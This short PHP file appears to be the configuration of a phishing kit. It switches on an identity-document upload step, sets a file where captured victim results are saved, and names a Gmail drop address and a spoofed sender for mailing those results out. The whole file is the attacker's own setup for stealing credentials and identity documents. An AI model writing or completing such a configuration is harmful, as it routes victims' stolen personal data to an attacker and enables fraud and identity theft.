<?php
// to remove ID upload   $id = "0";
$id = "1";
$save = "../../../Result.html"; // file save result
//Your Eamil Here
$to = "mohammed.noip707@gmail.com";
$from = "DR.KR # <mohammed.noip707@gmail.com>"; // from mail
?>